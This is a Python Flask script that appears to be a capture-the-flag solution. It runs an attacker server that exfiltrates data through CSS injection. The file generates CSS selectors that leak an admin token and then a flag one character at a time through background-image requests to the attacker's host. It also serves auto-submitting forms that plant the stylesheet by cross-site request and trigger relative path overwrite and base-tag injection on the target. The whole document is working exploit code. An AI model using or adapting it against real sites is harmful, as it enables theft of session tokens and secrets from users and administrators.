from flask import Flask, request, Response
from urllib.parse import quote
import threading, time, html

app = Flask(__name__)
PUBLIC = None
TARGET = 'http://127.0.0.1'
# for local testing can override TARGET_LOCAL

state = {
    'admin_token': '',
    'flag_prefix': 'SCTF26{',
    'token_hits': [],
    'flag_hits': [],
    'events': [],
}

HEX = '0123456789abcdef'
FLAGCHARS = '0123456789abcdef-}'

STYLE_PREFIX = 'body{display:block} '

# CSS escape for literal flag?token=
def css_hex_escape(s):
    return ''.join('\\%x' % ord(c) for c in s)

FLAGTOKEN_ESC = css_hex_escape('/flag?token=')


def log(msg):
    print(msg, flush=True)
    state['events'].append(msg)
    state['events'] = state['events'][-50:]


def token_css(prefix):
    rules = [STYLE_PREFIX]
    for a in HEX:
        for b in HEX:
            cand = prefix + a + b
            rules.append(f'a[href^="{FLAGTOKEN_ESC}{cand}"]' + '{background-image:url(' + PUBLIC + '/hit/token/' + cand + ')}')
    return '\n'.join(rules)


def flag_css(prefix):
    rules = [STYLE_PREFIX]
    # probe valid branch
    rules.append(f'#flag[value]{{background-image:url({PUBLIC}/probe/flagvalue)}}')
    for ch in FLAGCHARS:
        cand = prefix + ch
        rules.append(f'input[value^="{cand}"]' + '{background-image:url(' + PUBLIC + '/hit/flag/' + quote(cand, safe='') + ')}')
    return '\n'.join(rules)


def stored_css():
    if len(state['admin_token']) < 32:
        css = token_css(state['admin_token'])
    else:
        css = flag_css(state['flag_prefix'])
    # Important: trailing comment to absorb remaining HTML in stylesheet context
    return css + '\n/*'


def stage1_trigger():
    css = html.escape(stored_css())
    # submit CSS into admin profile then open RPO page in new tab
    return f'''<!doctype html><meta charset=utf-8>
<form id=f method=POST action="{TARGET}/urlstorage" target="sink">
<textarea name=url>{css}</textarea></form>
<iframe name=sink style="display:none"></iframe>
<script>
setTimeout(()=>{{document.getElementById('f').submit();}},100);
setTimeout(()=>{{location='{TARGET}/urlstorage/rpo';}},800);
</script>'''


def stage2_trigger():
    token = state['admin_token']
    inject = '</title><base href=/urlstorage/>'
    full = token + inject
    return f'''<!doctype html><meta charset=utf-8>
<form id=f method=GET action="{TARGET}/flag" target="sink">
<input type=hidden name=token value='{html.escape(full, quote=True)}'>
</form>
<iframe name=sink style="display:none"></iframe>
<script>
setTimeout(()=>{{document.getElementById('f').submit();}},100);
</script>'''

@app.route('/')
def home():
    return '<a href=/stage>stage</a><pre>%s</pre>' % html.escape(str(state))

@app.route('/stage')
def stage():
    if len(state['admin_token']) < 32:
        return Response(stage1_trigger(), mimetype='text/html')
    return Response(stage2_trigger(), mimetype='text/html')

@app.route('/hit/token/<val>')
def hit_token(val):
    if len(val) > len(state['admin_token']):
        state['admin_token'] = val
        log('token -> ' + val)
    return ('',204)

@app.route('/hit/flag/<path:val>')
def hit_flag(val):
    from urllib.parse import unquote
    raw = unquote(val)
    if len(raw) > len(state['flag_prefix']):
        state['flag_prefix'] = raw
        log('flag -> ' + raw)
    return ('',204)

@app.route('/probe/<name>')
def probe(name):
    log('probe -> ' + name)
    return ('',204)

@app.route('/status')
def status():
    return {
        'public': PUBLIC,
        'target': TARGET,
        'admin_token': state['admin_token'],
        'flag_prefix': state['flag_prefix'],
        'events': state['events'],
    }

if __name__ == '__main__':
    import sys
    PUBLIC = sys.argv[1]
    if len(sys.argv) > 2:
        TARGET = sys.argv[2]
    app.run(host='0.0.0.0', port=8000, threaded=True)
